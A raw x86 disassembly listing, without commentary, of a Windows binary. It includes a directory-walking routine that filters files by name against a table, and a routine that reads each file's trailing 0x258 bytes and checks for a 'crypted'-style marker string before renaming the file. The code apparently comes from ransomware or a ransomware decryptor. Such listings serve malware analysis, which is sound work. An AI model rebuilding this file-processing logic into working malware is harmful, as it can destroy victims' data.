  401cb7:	cc                   	int3
  401cb8:	cc                   	int3
  401cb9:	cc                   	int3
  401cba:	cc                   	int3
  401cbb:	cc                   	int3
  401cbc:	cc                   	int3
  401cbd:	cc                   	int3
  401cbe:	cc                   	int3
  401cbf:	cc                   	int3
  401cc0:	b8 50 8a 42 00       	mov    $0x428a50,%eax
  401cc5:	c3                   	ret
  401cc6:	cc                   	int3
  401cc7:	cc                   	int3
  401cc8:	cc                   	int3
  401cc9:	cc                   	int3
  401cca:	cc                   	int3
  401ccb:	cc                   	int3
  401ccc:	cc                   	int3
  401ccd:	cc                   	int3
  401cce:	cc                   	int3
  401ccf:	cc                   	int3
  401cd0:	83 ec 0c             	sub    $0xc,%esp
  401cd3:	8d 0c 24             	lea    (%esp),%ecx
  401cd6:	e8 e5 f7 ff ff       	call   0x4014c0
  401cdb:	68 70 66 42 00       	push   $0x426670
  401ce0:	8d 44 24 04          	lea    0x4(%esp),%eax
  401ce4:	50                   	push   %eax
  401ce5:	e8 2e 9b 00 00       	call   0x40b818
  401cea:	cc                   	int3
  401ceb:	cc                   	int3
  401cec:	cc                   	int3
  401ced:	cc                   	int3
  401cee:	cc                   	int3
  401cef:	cc                   	int3
  401cf0:	68 f0 ed 41 00       	push   $0x41edf0
  401cf5:	e8 a4 7b 00 00       	call   0x40989e
  401cfa:	cc                   	int3
  401cfb:	cc                   	int3
  401cfc:	cc                   	int3
  401cfd:	cc                   	int3
  401cfe:	cc                   	int3
  401cff:	cc                   	int3
  401d00:	68 e0 ed 41 00       	push   $0x41ede0
  401d05:	e8 94 7b 00 00       	call   0x40989e
  401d0a:	cc                   	int3
  401d0b:	cc                   	int3
  401d0c:	cc                   	int3
  401d0d:	cc                   	int3
  401d0e:	cc                   	int3
  401d0f:	cc                   	int3
  401d10:	55                   	push   %ebp
  401d11:	8d ac 24 1c f9 ff ff 	lea    -0x6e4(%esp),%ebp
  401d18:	81 ec e4 06 00 00    	sub    $0x6e4,%esp
  401d1e:	6a ff                	push   $0xffffffff
  401d20:	68 a5 db 41 00       	push   $0x41dba5
  401d25:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  401d2b:	50                   	push   %eax
  401d2c:	83 ec 24             	sub    $0x24,%esp
  401d2f:	a1 80 80 42 00       	mov    0x428080,%eax
  401d34:	33 c5                	xor    %ebp,%eax
  401d36:	89 85 e0 06 00 00    	mov    %eax,0x6e0(%ebp)
  401d3c:	53                   	push   %ebx
  401d3d:	56                   	push   %esi
  401d3e:	57                   	push   %edi
  401d3f:	50                   	push   %eax
  401d40:	8d 45 f4             	lea    -0xc(%ebp),%eax
  401d43:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  401d49:	8b bd ec 06 00 00    	mov    0x6ec(%ebp),%edi
  401d4f:	8d 85 58 04 00 00    	lea    0x458(%ebp),%eax
  401d55:	8b 9d f0 06 00 00    	mov    0x6f0(%ebp),%ebx
  401d5b:	57                   	push   %edi
  401d5c:	50                   	push   %eax
  401d5d:	89 7d e4             	mov    %edi,-0x1c(%ebp)
  401d60:	ff 15 50 e0 41 00    	call   *0x41e050
  401d66:	8b 35 54 e0 41 00    	mov    0x41e054,%esi
  401d6c:	8d 85 58 04 00 00    	lea    0x458(%ebp),%eax
  401d72:	68 48 e6 41 00       	push   $0x41e648
  401d77:	50                   	push   %eax
  401d78:	ff d6                	call   *%esi
  401d7a:	8b 15 20 8d 42 00    	mov    0x428d20,%edx
  401d80:	33 c9                	xor    %ecx,%ecx
  401d82:	8a 02                	mov    (%edx),%al
  401d84:	84 c0                	test   %al,%al
  401d86:	74 17                	je     0x401d9f
  401d88:	83 f9 1f             	cmp    $0x1f,%ecx
  401d8b:	7d 12                	jge    0x401d9f
  401d8d:	66 98                	cbtw
  401d8f:	66 89 84 4d 60 06 00 	mov    %ax,0x660(%ebp,%ecx,2)
  401d96:	00 
  401d97:	41                   	inc    %ecx
  401d98:	8a 04 0a             	mov    (%edx,%ecx,1),%al
  401d9b:	84 c0                	test   %al,%al
  401d9d:	75 e9                	jne    0x401d88
  401d9f:	03 c9                	add    %ecx,%ecx
  401da1:	83 f9 40             	cmp    $0x40,%ecx
  401da4:	0f 83 6e 03 00 00    	jae    0x402118
  401daa:	33 c0                	xor    %eax,%eax
  401dac:	66 89 84 0d 60 06 00 	mov    %ax,0x660(%ebp,%ecx,1)
  401db3:	00 
  401db4:	8d 85 60 06 00 00    	lea    0x660(%ebp),%eax
  401dba:	50                   	push   %eax
  401dbb:	8d 85 58 04 00 00    	lea    0x458(%ebp),%eax
  401dc1:	50                   	push   %eax
  401dc2:	ff d6                	call   *%esi
  401dc4:	68 5c e6 41 00       	push   $0x41e65c
  401dc9:	8d 85 58 04 00 00    	lea    0x458(%ebp),%eax
  401dcf:	50                   	push   %eax
  401dd0:	ff d6                	call   *%esi
  401dd2:	8d 85 58 04 00 00    	lea    0x458(%ebp),%eax
  401dd8:	50                   	push   %eax
  401dd9:	ff 15 08 e0 41 00    	call   *0x41e008
  401ddf:	6a 5c                	push   $0x5c
  401de1:	57                   	push   %edi
  401de2:	e8 0a 99 00 00       	call   0x40b6f1
  401de7:	8b f8                	mov    %eax,%edi
  401de9:	83 c4 08             	add    $0x8,%esp
  401dec:	85 ff                	test   %edi,%edi
  401dee:	74 32                	je     0x401e22
  401df0:	83 c7 02             	add    $0x2,%edi
  401df3:	be 00 80 42 00       	mov    $0x428000,%esi
  401df8:	0f 1f 84 00 00 00 00 	nopl   0x0(%eax,%eax,1)
  401dff:	00 
  401e00:	ff 36                	push   (%esi)
  401e02:	57                   	push   %edi
  401e03:	ff 15 4c e0 41 00    	call   *0x41e04c
  401e09:	85 c0                	test   %eax,%eax
  401e0b:	0f 84 e4 02 00 00    	je     0x4020f5
  401e11:	83 c6 04             	add    $0x4,%esi
  401e14:	81 fe 24 80 42 00    	cmp    $0x428024,%esi
  401e1a:	75 e4                	jne    0x401e00
  401e1c:	8b 35 54 e0 41 00    	mov    0x41e054,%esi
  401e22:	ff 75 e4             	push   -0x1c(%ebp)
  401e25:	8b 3d 50 e0 41 00    	mov    0x41e050,%edi
  401e2b:	8d 85 58 04 00 00    	lea    0x458(%ebp),%eax
  401e31:	50                   	push   %eax
  401e32:	ff d7                	call   *%edi
  401e34:	68 68 e6 41 00       	push   $0x41e668
  401e39:	8d 85 58 04 00 00    	lea    0x458(%ebp),%eax
  401e3f:	50                   	push   %eax
  401e40:	ff d6                	call   *%esi
  401e42:	8d 45 00             	lea    0x0(%ebp),%eax
  401e45:	50                   	push   %eax
  401e46:	8d 85 58 04 00 00    	lea    0x458(%ebp),%eax
  401e4c:	50                   	push   %eax
  401e4d:	ff 15 10 e0 41 00    	call   *0x41e010
  401e53:	89 45 e0             	mov    %eax,-0x20(%ebp)
  401e56:	83 f8 ff             	cmp    $0xffffffff,%eax
  401e59:	0f 84 96 02 00 00    	je     0x4020f5
  401e5f:	90                   	nop
  401e60:	68 70 e6 41 00       	push   $0x41e670
  401e65:	8d 45 2c             	lea    0x2c(%ebp),%eax
  401e68:	50                   	push   %eax
  401e69:	ff 15 48 e0 41 00    	call   *0x41e048
  401e6f:	85 c0                	test   %eax,%eax
  401e71:	0f 84 60 02 00 00    	je     0x4020d7
  401e77:	68 74 e6 41 00       	push   $0x41e674
  401e7c:	8d 45 2c             	lea    0x2c(%ebp),%eax
  401e7f:	50                   	push   %eax
  401e80:	ff 15 48 e0 41 00    	call   *0x41e048
  401e86:	85 c0                	test   %eax,%eax
  401e88:	0f 84 49 02 00 00    	je     0x4020d7
  401e8e:	ff 75 e4             	push   -0x1c(%ebp)
  401e91:	8d 85 50 02 00 00    	lea    0x250(%ebp),%eax
  401e97:	50                   	push   %eax
  401e98:	ff d7                	call   *%edi
  401e9a:	68 f8 e3 41 00       	push   $0x41e3f8
  401e9f:	8d 85 50 02 00 00    	lea    0x250(%ebp),%eax
  401ea5:	50                   	push   %eax
  401ea6:	ff d6                	call   *%esi
  401ea8:	8d 45 2c             	lea    0x2c(%ebp),%eax
  401eab:	50                   	push   %eax
  401eac:	8d 85 50 02 00 00    	lea    0x250(%ebp),%eax
  401eb2:	50                   	push   %eax
  401eb3:	ff d6                	call   *%esi
  401eb5:	f6 45 00 10          	testb  $0x10,0x0(%ebp)
  401eb9:	0f 84 be 00 00 00    	je     0x401f7d
  401ebf:	68 08 02 00 00       	push   $0x208
  401ec4:	e8 f0 85 00 00       	call   0x40a4b9
  401ec9:	83 c4 04             	add    $0x4,%esp
  401ecc:	89 45 e8             	mov    %eax,-0x18(%ebp)
  401ecf:	8d 8d 50 02 00 00    	lea    0x250(%ebp),%ecx
  401ed5:	51                   	push   %ecx
  401ed6:	50                   	push   %eax
  401ed7:	ff d7                	call   *%edi
  401ed9:	8d 7b 20             	lea    0x20(%ebx),%edi
  401edc:	c6 45 dc 00          	movb   $0x0,-0x24(%ebp)
  401ee0:	57                   	push   %edi
  401ee1:	89 7d d8             	mov    %edi,-0x28(%ebp)
  401ee4:	e8 1a 7b 00 00       	call   0x409a03
  401ee9:	83 c4 04             	add    $0x4,%esp
  401eec:	85 c0                	test   %eax,%eax
  401eee:	0f 85 34 02 00 00    	jne    0x402128
  401ef4:	8b 47 2c             	mov    0x2c(%edi),%eax
  401ef7:	3d ff ff ff 7f       	cmp    $0x7fffffff,%eax
  401efc:	0f 84 1b 02 00 00    	je     0x40211d
  401f02:	c6 45 dc 01          	movb   $0x1,-0x24(%ebp)
  401f06:	8b 43 1c             	mov    0x1c(%ebx),%eax
  401f09:	40                   	inc    %eax
  401f0a:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  401f11:	39 43 14             	cmp    %eax,0x14(%ebx)
  401f14:	77 0a                	ja     0x401f20
  401f16:	6a 01                	push   $0x1
  401f18:	8d 4b 0c             	lea    0xc(%ebx),%ecx
  401f1b:	e8 f0 fb ff ff       	call   0x401b10
  401f20:	8b 4b 14             	mov    0x14(%ebx),%ecx
  401f23:	8d 41 ff             	lea    -0x1(%ecx),%eax
  401f26:	21 43 18             	and    %eax,0x18(%ebx)
  401f29:	8d 41 ff             	lea    -0x1(%ecx),%eax
  401f2c:	8b 53 1c             	mov    0x1c(%ebx),%edx
  401f2f:	03 53 18             	add    0x18(%ebx),%edx
  401f32:	23 c2                	and    %edx,%eax
  401f34:	89 55 ec             	mov    %edx,-0x14(%ebp)
  401f37:	8d 0c 85 00 00 00 00 	lea    0x0(,%eax,4),%ecx
  401f3e:	8b 43 10             	mov    0x10(%ebx),%eax
  401f41:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  401f44:	83 3c 01 00          	cmpl   $0x0,(%ecx,%eax,1)
  401f48:	75 16                	jne    0x401f60
  401f4a:	6a 28                	push   $0x28
  401f4c:	e8 2a 85 00 00       	call   0x40a47b
  401f51:	8b 55 f0             	mov    -0x10(%ebp),%edx
  401f54:	83 c4 04             	add    $0x4,%esp
  401f57:	8b 4b 10             	mov    0x10(%ebx),%ecx
  401f5a:	89 04 0a             	mov    %eax,(%edx,%ecx,1)
  401f5d:	8b 55 ec             	mov    -0x14(%ebp),%edx
  401f60:	8b 4b 14             	mov    0x14(%ebx),%ecx
  401f63:	8b 43 10             	mov    0x10(%ebx),%eax
  401f66:	49                   	dec    %ecx
  401f67:	23 ca                	and    %edx,%ecx
  401f69:	8b 04 88             	mov    (%eax,%ecx,4),%eax
  401f6c:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  401f6f:	c7 00 08 ee 41 00    	movl   $0x41ee08,(%eax)
  401f75:	89 58 08             	mov    %ebx,0x8(%eax)
  401f78:	e9 2c 01 00 00       	jmp    0x4020a9
  401f7d:	8d 45 2c             	lea    0x2c(%ebp),%eax
  401f80:	6a 2e                	push   $0x2e
  401f82:	50                   	push   %eax
  401f83:	e8 69 97 00 00       	call   0x40b6f1
  401f88:	8b f0                	mov    %eax,%esi
  401f8a:	83 c4 08             	add    $0x8,%esp
  401f8d:	85 f6                	test   %esi,%esi
  401f8f:	0f 84 3c 01 00 00    	je     0x4020d1
  401f95:	8b 15 20 8d 42 00    	mov    0x428d20,%edx
  401f9b:	b8 2e 00 00 00       	mov    $0x2e,%eax
  401fa0:	66 89 85 a0 06 00 00 	mov    %ax,0x6a0(%ebp)
  401fa7:	8d 48 d3             	lea    -0x2d(%eax),%ecx
  401faa:	8a 02                	mov    (%edx),%al
  401fac:	84 c0                	test   %al,%al
  401fae:	74 18                	je     0x401fc8
  401fb0:	83 f9 1f             	cmp    $0x1f,%ecx
  401fb3:	7d 13                	jge    0x401fc8
  401fb5:	66 98                	cbtw
  401fb7:	66 89 84 4d a0 06 00 	mov    %ax,0x6a0(%ebp,%ecx,2)
  401fbe:	00 
  401fbf:	41                   	inc    %ecx
  401fc0:	8a 44 0a ff          	mov    -0x1(%edx,%ecx,1),%al
  401fc4:	84 c0                	test   %al,%al
  401fc6:	75 e8                	jne    0x401fb0
  401fc8:	03 c9                	add    %ecx,%ecx
  401fca:	83 f9 40             	cmp    $0x40,%ecx
  401fcd:	0f 83 45 01 00 00    	jae    0x402118
  401fd3:	33 c0                	xor    %eax,%eax
  401fd5:	66 89 84 0d a0 06 00 	mov    %ax,0x6a0(%ebp,%ecx,1)
  401fdc:	00 
  401fdd:	8d 85 a0 06 00 00    	lea    0x6a0(%ebp),%eax
  401fe3:	50                   	push   %eax
  401fe4:	56                   	push   %esi
  401fe5:	ff 15 4c e0 41 00    	call   *0x41e04c
  401feb:	85 c0                	test   %eax,%eax
  401fed:	0f 85 de 00 00 00    	jne    0x4020d1
  401ff3:	68 08 02 00 00       	push   $0x208
  401ff8:	e8 bc 84 00 00       	call   0x40a4b9
  401ffd:	83 c4 04             	add    $0x4,%esp
  402000:	89 45 f0             	mov    %eax,-0x10(%ebp)
  402003:	8d 8d 50 02 00 00    	lea    0x250(%ebp),%ecx
  402009:	51                   	push   %ecx
  40200a:	50                   	push   %eax
  40200b:	ff d7                	call   *%edi
  40200d:	8d 7b 20             	lea    0x20(%ebx),%edi
  402010:	c6 45 d4 00          	movb   $0x0,-0x2c(%ebp)
  402014:	57                   	push   %edi
  402015:	89 7d d0             	mov    %edi,-0x30(%ebp)
  402018:	e8 e6 79 00 00       	call   0x409a03
  40201d:	83 c4 04             	add    $0x4,%esp
  402020:	85 c0                	test   %eax,%eax
  402022:	0f 85 00 01 00 00    	jne    0x402128
  402028:	8b 47 2c             	mov    0x2c(%edi),%eax
  40202b:	3d ff ff ff 7f       	cmp    $0x7fffffff,%eax
  402030:	0f 84 e7 00 00 00    	je     0x40211d
  402036:	c6 45 d4 01          	movb   $0x1,-0x2c(%ebp)
  40203a:	8b 43 1c             	mov    0x1c(%ebx),%eax
  40203d:	40                   	inc    %eax
  40203e:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402045:	39 43 14             	cmp    %eax,0x14(%ebx)
  402048:	77 0a                	ja     0x402054
  40204a:	6a 01                	push   $0x1
  40204c:	8d 4b 0c             	lea    0xc(%ebx),%ecx
  40204f:	e8 bc fa ff ff       	call   0x401b10
  402054:	8b 4b 14             	mov    0x14(%ebx),%ecx
  402057:	8d 41 ff             	lea    -0x1(%ecx),%eax
  40205a:	21 43 18             	and    %eax,0x18(%ebx)
  40205d:	8d 41 ff             	lea    -0x1(%ecx),%eax
  402060:	8b 53 1c             	mov    0x1c(%ebx),%edx
  402063:	03 53 18             	add    0x18(%ebx),%edx
  402066:	23 c2                	and    %edx,%eax
  402068:	89 55 ec             	mov    %edx,-0x14(%ebp)
  40206b:	8d 0c 85 00 00 00 00 	lea    0x0(,%eax,4),%ecx
  402072:	8b 43 10             	mov    0x10(%ebx),%eax
  402075:	89 4d e8             	mov    %ecx,-0x18(%ebp)
  402078:	83 3c 01 00          	cmpl   $0x0,(%ecx,%eax,1)
  40207c:	75 16                	jne    0x402094
  40207e:	6a 28                	push   $0x28
  402080:	e8 f6 83 00 00       	call   0x40a47b
  402085:	8b 55 e8             	mov    -0x18(%ebp),%edx
  402088:	83 c4 04             	add    $0x4,%esp
  40208b:	8b 4b 10             	mov    0x10(%ebx),%ecx
  40208e:	89 04 0a             	mov    %eax,(%edx,%ecx,1)
  402091:	8b 55 ec             	mov    -0x14(%ebp),%edx
  402094:	8b 4b 14             	mov    0x14(%ebx),%ecx
  402097:	8b 43 10             	mov    0x10(%ebx),%eax
  40209a:	49                   	dec    %ecx
  40209b:	23 ca                	and    %edx,%ecx
  40209d:	8b 04 88             	mov    (%eax,%ecx,4),%eax
  4020a0:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4020a3:	c7 00 24 ee 41 00    	movl   $0x41ee24,(%eax)
  4020a9:	89 48 04             	mov    %ecx,0x4(%eax)
  4020ac:	89 40 24             	mov    %eax,0x24(%eax)
  4020af:	ff 43 1c             	incl   0x1c(%ebx)
  4020b2:	57                   	push   %edi
  4020b3:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  4020ba:	e8 55 79 00 00       	call   0x409a14
  4020bf:	8d 43 50             	lea    0x50(%ebx),%eax
  4020c2:	50                   	push   %eax
  4020c3:	e8 cb 7a 00 00       	call   0x409b93
  4020c8:	8b 3d 50 e0 41 00    	mov    0x41e050,%edi
  4020ce:	83 c4 08             	add    $0x8,%esp
  4020d1:	8b 35 54 e0 41 00    	mov    0x41e054,%esi
  4020d7:	8d 45 00             	lea    0x0(%ebp),%eax
  4020da:	50                   	push   %eax
  4020db:	ff 75 e0             	push   -0x20(%ebp)
  4020de:	ff 15 14 e0 41 00    	call   *0x41e014
  4020e4:	85 c0                	test   %eax,%eax
  4020e6:	0f 85 74 fd ff ff    	jne    0x401e60
  4020ec:	ff 75 e0             	push   -0x20(%ebp)
  4020ef:	ff 15 0c e0 41 00    	call   *0x41e00c
  4020f5:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4020f8:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4020ff:	59                   	pop    %ecx
  402100:	5f                   	pop    %edi
  402101:	5e                   	pop    %esi
  402102:	5b                   	pop    %ebx
  402103:	8b 8d e0 06 00 00    	mov    0x6e0(%ebp),%ecx
  402109:	33 cd                	xor    %ebp,%ecx
  40210b:	e8 b7 85 00 00       	call   0x40a6c7
  402110:	8d a5 e4 06 00 00    	lea    0x6e4(%ebp),%esp
  402116:	5d                   	pop    %ebp
  402117:	c3                   	ret
  402118:	e8 cd 84 00 00       	call   0x40a5ea
  40211d:	48                   	dec    %eax
  40211e:	6a 06                	push   $0x6
  402120:	89 47 2c             	mov    %eax,0x2c(%edi)
  402123:	e8 19 81 00 00       	call   0x40a241
  402128:	6a 05                	push   $0x5
  40212a:	e8 12 81 00 00       	call   0x40a241
  40212f:	cc                   	int3
  402130:	b8 c8 15 00 00       	mov    $0x15c8,%eax
  402135:	e8 36 88 00 00       	call   0x40a970
  40213a:	a1 80 80 42 00       	mov    0x428080,%eax
  40213f:	33 c4                	xor    %esp,%eax
  402141:	89 84 24 c4 15 00 00 	mov    %eax,0x15c4(%esp)
  402148:	53                   	push   %ebx
  402149:	8b 9c 24 d0 15 00 00 	mov    0x15d0(%esp),%ebx
  402150:	56                   	push   %esi
  402151:	68 00 00 01 00       	push   $0x10000
  402156:	e8 15 75 00 00       	call   0x409670
  40215b:	8b f0                	mov    %eax,%esi
  40215d:	83 c4 04             	add    $0x4,%esp
  402160:	85 f6                	test   %esi,%esi
  402162:	75 25                	jne    0x402189
  402164:	53                   	push   %ebx
  402165:	68 50 e3 41 00       	push   $0x41e350
  40216a:	e8 41 15 00 00       	call   0x4036b0
  40216f:	83 c4 08             	add    $0x8,%esp
  402172:	5e                   	pop    %esi
  402173:	5b                   	pop    %ebx
  402174:	8b 8c 24 c4 15 00 00 	mov    0x15c4(%esp),%ecx
  40217b:	33 cc                	xor    %esp,%ecx
  40217d:	e8 45 85 00 00       	call   0x40a6c7
  402182:	81 c4 c8 15 00 00    	add    $0x15c8,%esp
  402188:	c3                   	ret
  402189:	55                   	push   %ebp
  40218a:	8b 2d 04 e0 41 00    	mov    0x41e004,%ebp
  402190:	57                   	push   %edi
  402191:	6a 00                	push   $0x0
  402193:	68 80 00 00 00       	push   $0x80
  402198:	6a 03                	push   $0x3
  40219a:	6a 00                	push   $0x0
  40219c:	6a 01                	push   $0x1
  40219e:	68 00 00 00 c0       	push   $0xc0000000
  4021a3:	53                   	push   %ebx
  4021a4:	ff d5                	call   *%ebp
  4021a6:	8b f8                	mov    %eax,%edi
  4021a8:	83 ff ff             	cmp    $0xffffffff,%edi
  4021ab:	75 1d                	jne    0x4021ca
  4021ad:	ff 15 3c e0 41 00    	call   *0x41e03c
  4021b3:	50                   	push   %eax
  4021b4:	53                   	push   %ebx
  4021b5:	68 a8 e3 41 00       	push   $0x41e3a8
  4021ba:	e8 f1 14 00 00       	call   0x4036b0
  4021bf:	56                   	push   %esi
  4021c0:	e8 db 74 00 00       	call   0x4096a0
  4021c5:	83 c4 10             	add    $0x10,%esp
  4021c8:	eb 31                	jmp    0x4021fb
  4021ca:	8d 44 24 14          	lea    0x14(%esp),%eax
  4021ce:	50                   	push   %eax
  4021cf:	57                   	push   %edi
  4021d0:	ff 15 20 e0 41 00    	call   *0x41e020
  4021d6:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  4021da:	8b 44 24 14          	mov    0x14(%esp),%eax
  4021de:	85 c9                	test   %ecx,%ecx
  4021e0:	7f 32                	jg     0x402214
  4021e2:	7c 07                	jl     0x4021eb
  4021e4:	3d 58 02 00 00       	cmp    $0x258,%eax
  4021e9:	77 29                	ja     0x402214
  4021eb:	57                   	push   %edi
  4021ec:	ff 15 38 e0 41 00    	call   *0x41e038
  4021f2:	56                   	push   %esi
  4021f3:	e8 a8 74 00 00       	call   0x4096a0
  4021f8:	83 c4 04             	add    $0x4,%esp
  4021fb:	8b 8c 24 d4 15 00 00 	mov    0x15d4(%esp),%ecx
  402202:	5f                   	pop    %edi
  402203:	5d                   	pop    %ebp
  402204:	5e                   	pop    %esi
  402205:	5b                   	pop    %ebx
  402206:	33 cc                	xor    %esp,%ecx
  402208:	e8 ba 84 00 00       	call   0x40a6c7
  40220d:	81 c4 c8 15 00 00    	add    $0x15c8,%esp
  402213:	c3                   	ret
  402214:	6a 00                	push   $0x0
  402216:	2d 58 02 00 00       	sub    $0x258,%eax
  40221b:	6a 00                	push   $0x0
  40221d:	83 d9 00             	sbb    $0x0,%ecx
  402220:	51                   	push   %ecx
  402221:	50                   	push   %eax
  402222:	57                   	push   %edi
  402223:	ff 15 30 e0 41 00    	call   *0x41e030
  402229:	6a 00                	push   $0x0
  40222b:	8d 44 24 14          	lea    0x14(%esp),%eax
  40222f:	50                   	push   %eax
  402230:	68 58 02 00 00       	push   $0x258
  402235:	8d 84 24 94 00 00 00 	lea    0x94(%esp),%eax
  40223c:	50                   	push   %eax
  40223d:	57                   	push   %edi
  40223e:	ff 15 28 e0 41 00    	call   *0x41e028
  402244:	57                   	push   %edi
  402245:	ff 15 38 e0 41 00    	call   *0x41e038
  40224b:	81 bc 24 b0 00 00 00 	cmpl   $0x79726378,0xb0(%esp)
  402252:	78 63 72 79 
  402256:	75 9a                	jne    0x4021f2
  402258:	81 bc 24 b4 00 00 00 	cmpl   $0x64657464,0xb4(%esp)
  40225f:	64 74 65 64 
  402263:	75 8d                	jne    0x4021f2
  402265:	81 bc 24 b8 00 00 00 	cmpl   $0x73746f6e,0xb8(%esp)
  40226c:	6e 6f 74 73 
  402270:	75 80                	jne    0x4021f2
  402272:	81 bc 24 bc 00 00 00 	cmpl   $0x6c6c6974,0xbc(%esp)
  402279:	74 69 6c 6c 
  40227d:	0f 85 6f ff ff ff    	jne    0x4021f2
  402283:	81 bc 24 c0 00 00 00 	cmpl   $0x616d615f,0xc0(%esp)
  40228a:	5f 61 6d 61 
  40228e:	0f 85 5e ff ff ff    	jne    0x4021f2
  402294:	81 bc 24 c4 00 00 00 	cmpl   $0x676e697a,0xc4(%esp)
  40229b:	7a 69 6e 67 
  40229f:	0f 85 4d ff ff ff    	jne    0x4021f2
  4022a5:	81 bc 24 c8 00 00 00 	cmpl   $0x69745f67,0xc8(%esp)
  4022ac:	67 5f 74 69 
  4022b0:	0f 85 3c ff ff ff    	jne    0x4021f2
  4022b6:	81 bc 24 cc 00 00 00 	cmpl   $0x2121656d,0xcc(%esp)
  4022bd:	6d 65 21 21 
  4022c1:	0f 85 2b ff ff ff    	jne    0x4021f2
  4022c7:	80 bc 24 d5 00 00 00 	cmpb   $0x0,0xd5(%esp)
  4022ce:	00 
  4022cf:	0f 84 b9 00 00 00    	je     0x40238e
  4022d5:	66 83 bc 24 d6 00 00 	cmpw   $0x0,0xd6(%esp)
  4022dc:	00 00 
  4022de:	0f 84 aa 00 00 00    	je     0x40238e
  4022e4:	6a 5c                	push   $0x5c
  4022e6:	53                   	push   %ebx
  4022e7:	e8 05 94 00 00       	call   0x40b6f1
  4022ec:	8b f8                	mov    %eax,%edi
  4022ee:	83 c4 08             	add    $0x8,%esp
  4022f1:	85 ff                	test   %edi,%edi
  4022f3:	74 33                	je     0x402328
  4022f5:	2b fb                	sub    %ebx,%edi
  4022f7:	d1 ff                	sar    $1,%edi
  4022f9:	47                   	inc    %edi
  4022fa:	57                   	push   %edi
  4022fb:	53                   	push   %ebx
  4022fc:	68 00 80 00 00       	push   $0x8000
  402301:	56                   	push   %esi
  402302:	e8 59 bb 00 00       	call   0x40de60
  402307:	33 c0                	xor    %eax,%eax
  402309:	66 89 04 7e          	mov    %ax,(%esi,%edi,2)
  40230d:	8d 84 24 e6 00 00 00 	lea    0xe6(%esp),%eax
  402314:	50                   	push   %eax
  402315:	68 00 80 00 00       	push   $0x8000
  40231a:	56                   	push   %esi
  40231b:	e8 90 ba 00 00       	call   0x40ddb0
  402320:	83 c4 1c             	add    $0x1c,%esp
  402323:	e9 91 00 00 00       	jmp    0x4023b9
  402328:	8d 84 24 cc 13 00 00 	lea    0x13cc(%esp),%eax
  40232f:	50                   	push   %eax
  402330:	68 04 01 00 00       	push   $0x104
  402335:	ff 15 00 e0 41 00    	call   *0x41e000
  40233b:	8d 84 24 cc 13 00 00 	lea    0x13cc(%esp),%eax
  402342:	50                   	push   %eax
  402343:	ff 15 58 e0 41 00    	call   *0x41e058
  402349:	66 83 bc 44 ca 13 00 	cmpw   $0x5c,0x13ca(%esp,%eax,2)
  402350:	00 5c 
  402352:	74 13                	je     0x402367
  402354:	68 f8 e3 41 00       	push   $0x41e3f8
  402359:	8d 84 24 d0 13 00 00 	lea    0x13d0(%esp),%eax
  402360:	50                   	push   %eax
  402361:	ff 15 54 e0 41 00    	call   *0x41e054
  402367:	8d 84 24 cc 13 00 00 	lea    0x13cc(%esp),%eax
  40236e:	50                   	push   %eax
  40236f:	56                   	push   %esi
  402370:	ff 15 50 e0 41 00    	call   *0x41e050
  402376:	8d 84 24 d6 00 00 00 	lea    0xd6(%esp),%eax
  40237d:	50                   	push   %eax
  40237e:	68 00 80 00 00       	push   $0x8000
  402383:	56                   	push   %esi
  402384:	e8 27 ba 00 00       	call   0x40ddb0
  402389:	83 c4 0c             	add    $0xc,%esp
  40238c:	eb 2b                	jmp    0x4023b9
  40238e:	53                   	push   %ebx
  40238f:	56                   	push   %esi
  402390:	ff 15 50 e0 41 00    	call   *0x41e050
  402396:	8b 3d 20 8d 42 00    	mov    0x428d20,%edi
  40239c:	8d 4f 01             	lea    0x1(%edi),%ecx
  40239f:	90                   	nop
  4023a0:	8a 07                	mov    (%edi),%al
  4023a2:	47                   	inc    %edi
  4023a3:	84 c0                	test   %al,%al
  4023a5:	75 f9                	jne    0x4023a0
  4023a7:	53                   	push   %ebx
  4023a8:	2b f9                	sub    %ecx,%edi
  4023aa:	ff 15 58 e0 41 00    	call   *0x41e058
  4023b0:	2b c7                	sub    %edi,%eax
  4023b2:	33 c9                	xor    %ecx,%ecx
  4023b4:	66 89 4c 46 fe       	mov    %cx,-0x2(%esi,%eax,2)
  4023b9:	6a 09                	push   $0x9
  4023bb:	56                   	push   %esi
  4023bc:	53                   	push   %ebx
  4023bd:	ff 15 5c e0 41 00    	call   *0x41e05c
  4023c3:	85 c0                	test   %eax,%eax
  4023c5:	75 20                	jne    0x4023e7
  4023c7:	ff 15 3c e0 41 00    	call   *0x41e03c
  4023cd:	50                   	push   %eax
  4023ce:	53                   	push   %ebx
  4023cf:	68 00 e4 41 00       	push   $0x41e400
  4023d4:	e8 d7 12 00 00       	call   0x4036b0
  4023d9:	56                   	push   %esi
  4023da:	e8 c1 72 00 00       	call   0x4096a0
  4023df:	83 c4 10             	add    $0x10,%esp
  4023e2:	e9 14 fe ff ff       	jmp    0x4021fb
  4023e7:	6a 00                	push   $0x0
  4023e9:	68 80 00 00 00       	push   $0x80
  4023ee:	6a 03                	push   $0x3
  4023f0:	6a 00                	push   $0x0
  4023f2:	6a 01                	push   $0x1
  4023f4:	68 00 00 00 c0       	push   $0xc0000000
  4023f9:	56                   	push   %esi
  4023fa:	ff d5                	call   *%ebp
  4023fc:	56                   	push   %esi
  4023fd:	8b d8                	mov    %eax,%ebx
  4023ff:	e8 9c 72 00 00       	call   0x4096a0
  402404:	83 c4 04             	add    $0x4,%esp
  402407:	83 fb ff             	cmp    $0xffffffff,%ebx
  40240a:	75 19                	jne    0x402425
  40240c:	ff 15 3c e0 41 00    	call   *0x41e03c
  402412:	50                   	push   %eax
  402413:	68 60 e4 41 00       	push   $0x41e460
  402418:	e8 93 12 00 00       	call   0x4036b0
  40241d:	83 c4 08             	add    $0x8,%esp
  402420:	e9 d6 fd ff ff       	jmp    0x4021fb
  402425:	8d 44 24 14          	lea    0x14(%esp),%eax
  402429:	50                   	push   %eax
  40242a:	53                   	push   %ebx
